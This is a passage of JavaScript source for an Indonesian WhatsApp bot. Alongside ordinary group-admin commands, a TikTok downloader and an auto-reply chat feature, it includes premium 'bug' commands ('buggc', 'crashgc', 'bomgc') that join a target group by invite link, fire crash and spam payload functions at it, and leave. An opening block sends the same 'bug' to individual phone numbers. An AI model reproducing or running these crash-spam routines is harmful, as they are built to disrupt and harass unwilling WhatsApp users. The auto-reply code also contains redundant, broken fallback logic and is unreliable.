let tareget = targetnya+'@s.whatsapp.net'
if (cekap.length == 0) return reply(`Nomor Tersebut Tidak Terdaftar Di WhatsApp`)
mentions(`*Bug Sedang Dikirim Ke Target @${tareget.split('@')[0]}*\n*Mohon Tunggu Sebentar!*\n\n*Note:* _Proses Pengiriman Bug Sekitar 1-10 Menit, Tergantung Jumlah Spam Bug Yang Dikirim._\n\n© 𝚃𝚘𝚢𝚊𝙱𝚄𝙶ᵛ¹`, [tareget])
await sleep(2000)
santet_andro_teks(tareget,inijumlah)
sendBugButton(initarget,1)
mentions(`*BERHASIL MENGIRIM ${command.toUpperCase()}*\n*TARGET :* @${tareget.split('@')[0]}\n*JUMLAH SPAM :* ${inijumlah}×\n\n*_NOTE :_*\n*HARAP JEDA 1 MENIT*\n*AGAR BOT TIDAK KEBAN*`, [tareget])
}
break
case 'gasgc':
case 'bomgc':
case 'buggc':
case 'travagc':
case 'crashgc':{
if (!isLeccy) return reply (`*Fitur Ini Khusus Member Premium!*`)
if (!q) return reply(`*CARA MENGIRIM BUG GROUB*\n\n${prefix+command} https://chat.whatsapp.com/xxxx\n\n_*Note:*_ Jika ingin mengirim bug dengan jumlah banyak, silahkan ketik sebagai berikut ini\n\nEx: .${command} linkgc jumlahbug\n\nContoh:\n.${command} https://chat.whatsapp.com/xxxx 10\n\n©leccyofc`)
reply(teks_proses)
if (!args[0].includes('whatsapp.com')) return reply('Link Invalid!')
resjoin = args[0].split('https://chat.whatsapp.com/')[1]
try {
inijumlah = args[1] ? args[1]: '1'
initarget = await leccy.groupAcceptInvite(resjoin)
santet_andro_teks(initarget,2)
docu2(initarget,inijumlah)
docu3(initarget,inijumlah)
sendBugButton(initarget,1)
await sleep(3000)
reply('*DONE BUG SUDAH TERKIRIM KE GROUP!.*')
leccy.groupLeave(initarget)
} catch (e) {
reply(util.format(e))
}}
break
case 'join':
if (msg.key.fromMe) return
if (!isLeccy) return reply('Fitur ini Khusus Owner Bot')
if (!q) return reply('Enter Group Link!\nEx: .join https://chat.whatsapp.com/xxxx')
if (!args[0].includes('whatsapp.com')) return reply('Link Invalid!')
resjoin = args[0].split('https://chat.whatsapp.com/')[1]
try {
join = await leccy.groupAcceptInvite(resjoin)
reply(join)
} catch (e) {
reply(util.format(e))
}
break
case 'linkgrup': case 'linkgc':{
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!')
if (!isGroupAdmins && !isLeccy) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
url_ = await leccy.groupInviteCode(from)
yurl = 'https://chat.whatsapp.com/'+url_
reply(yurl)
}
break
case 'open':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins && !isLeccy) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!')
await leccy.groupSettingUpdate(from, 'not_announcement')
const openteks = `*OPENED* The group is opened by admin\nNow members can send messages`
reply(openteks)
break
case 'close':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins && !isLeccy) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!')
await leccy.groupSettingUpdate(from, 'announcement')
const closeteks = `*CLOSED* group closed by admin\nnow only admin can send messages`
reply(closeteks)
break
case 'revoke':{
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!')
if (!isGroupAdmins && !isLeccy) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
await leccy.groupRevokeInvite(from).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'kick':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins && !isLeccy) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
reply('Sampah Grup Berhasil di Keluarkan!')
remove = msg.message.extendedTextMessage.contextInfo.participant
await leccy.groupParticipantsUpdate(from, [remove], "remove")
break
case 'hidetag':{
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins && !isLeccy) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
let mem = [];
groupMembers.map( i => mem.push(i.id) )
leccy.sendMessage(from, { text: q ? q : '', mentions: mem })
}
break
case 'promote':{
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins && !isLeccy) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
promote = msg.message.extendedTextMessage.contextInfo.participant
await leccy.groupParticipantsUpdate(from, [promote], "promote").then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'demote':{
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins && !isLeccy) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
demote = msg.message.extendedTextMessage.contextInfo.participant
await leccy.groupParticipantsUpdate(from, [demote], "demote").then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'setname':
case 'setsubject':{
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins && !isLeccy) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!')
if (!q) return reply('Nama Group Nya Mana?\n\nEx:\n.setname nama_group')
await leccy.groupUpdateSubject(from, q).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'setdesc':
case 'setdesk':{
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins && !isLeccy) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!')
if (!q) return reply('Teks Deskripsi Nya Mana?\n\nEx:\n.setdesc teks_deskripsi')
await leccy.groupUpdateDescription(from, q).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'editinfo':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins && !isLeccy) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!')
if (args[0] === 'open') {
await leccy.groupSettingUpdate(from, "unlocked").then((res) => reply(`Successfully Opened Group Edit Info`)).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'close') {
await leccy.groupSettingUpdate(from, "locked").then((res) => reply(`Successfully Closed Group Edit Info`)).catch((err) => reply(jsonformat(err)))
} else {
reply(`*MODE DESKRIPSI GROUP*\n\n*_Open : semua member bisa edit deskripsi grup_*\n\n*_Close: hanya admin group yang bisa edit deskripsi_*\n\n*Example:*\n${prefix+command} close`)
}
break

default:
if (tiktokauto && chats.includes('tiktok.com') && body != undefined){
if (!chats.includes('tiktok.com')) return
if (isGroup) return
if (msg.key.fromMe) return
react("⏳")
let { tiktokDL } = require('./lib/tiktok');
try{
let data = await tiktokDL(chats)
if (data.status == true){
const cptt =`*TIKTOK DOWNLOADER*

- *Title :* ${data.video.title}

_*Author*_
- *Username :* ${data.author.username}
- *Fullname :* ${data.author.fullname}
- *Region :* ${data.author.region}

_*Count*_
- *Duration :* ${data.count.duration}
- *Comment :* ${data.count.comment}
- *Download :* ${data.count.download}
- *Views :* ${data.count.views}
- *Shares :* ${data.count.shares}
`
sendvidio(data.video.nowm, cptt).then(() => sendaudio(data.music.url,data.music.title))
}} catch (e) {
await sleep(2000)
react("❌")
}}

// function bot ai
if (botautoaichat && body !== undefined) {
if (chats.includes('tiktok.com')) return
if (body){
if (isGroup) return
if (msg.key.fromMe) return
react("🔎")
try {
const aiopt = await fetchJson("https://vihangayt.me/tools/chatgpt?q="+chats)
if (aiopt.err){
const aiopt = await fetchJson("https://vihangayt.me/tools/chatgpt2?q="+chats)
} else if (aiopt.err){
const aiopt = await fetchJson("https://vihangayt.me/tools/chatgpt3?q="+chats)
} else if (aiopt.err){
const aiopt = await fetchJson("https://vihangayt.me/tools/chatgpt4?q="+chats)
} else if (aiopt.err){
const aiopt = await fetchJson("https://vihangayt.me/tools/chatgpt5?q="+chats)
} else if (aiopt.err){
const aiopt = await fetchJson("https://vihangayt.me/tools/chatgpt?q="+chats)
}
reply(aiopt.data).then(() => react("✅"))
} catch (e){
await sleep(1000)
react("❌")
}}}

}} catch (err) {
}}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})